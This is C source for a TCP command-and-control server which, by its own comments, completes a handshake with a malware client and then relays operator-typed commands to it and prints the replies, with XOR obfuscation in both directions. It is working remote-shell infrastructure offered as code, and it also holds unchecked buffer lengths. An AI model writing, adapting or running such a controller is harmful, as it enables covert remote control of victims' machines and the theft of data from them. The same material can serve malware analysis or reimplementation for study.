void func(int sockfd) 
{ 
    char buff[MAX]; 
    char header[4];
    char input[MAX];
    char output[MAX];
    int n, len, inp_len; 

    /* First Handshake between Malware and Server */
    bzero(buff, MAX); 

    recv(sockfd, buff, MAX, 0); 
    printf("From client: %s\n", buff); 
//    if(strncmp("*(SY)#", buff, 6) == 0)
    write(sockfd, "*(SY)# cmd\n", 11);
    printf("To client: *(SY)# cmd\n");

    // infinite loop for chat 
    for (;;) { 
  	bzero(output, MAX);
	puts("=== Reading message ===");

        // read the message header
	recv(sockfd, header, 4, 0);
	// calculate length
	len = atoi(header);
	
	// read rest of the msg
	recv(sockfd, output, len, 0);

	// decrypt message
	xorstring(output, len);

        // print buffer which contains the client contents 
        printf("%s\n*(SY)# > ", output); 

	bzero(input, MAX); 
        n = 0; 

        // copy server message in the buffer 
        while ((input[n++] = getchar()) != '\n'); 

	inp_len = strlen(input);

	//encrypt the string
  	xorstring(input, inp_len);
        // and send that buffer to client 
        write(sockfd, input, inp_len); 
    } 
} 
  

int main() 
{ 
    int sockfd, connfd, len; 
    struct sockaddr_in servaddr, cli; 
  
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
        printf("socket creation failed...\n"); 
        exit(0); 
    } 
    else
        printf("Socket successfully created..\n"); 
    bzero(&servaddr, sizeof(servaddr)); 
  
    servaddr.sin_family = AF_INET; 
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
    servaddr.sin_port = htons(PORT); 
  
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) { 
        printf("socket bind failed...\n"); 
        exit(0); 
    } 
    else
        printf("Socket successfully binded..\n"); 
  
    if ((listen(sockfd, 5)) != 0) { 
        printf("Listen failed...\n"); 
        exit(0); 
    } 
    else
        printf("Server listening..\n"); 
    len = sizeof(cli); 

    connfd = accept(sockfd, (SA*)&cli, &len); 
    if (connfd < 0) { 
        printf("server acccept failed...\n"); 
        exit(0); 
    } 
    else
        printf("server acccept the client...\n"); 
  
    func(connfd); 
  
    close(sockfd); 
} 

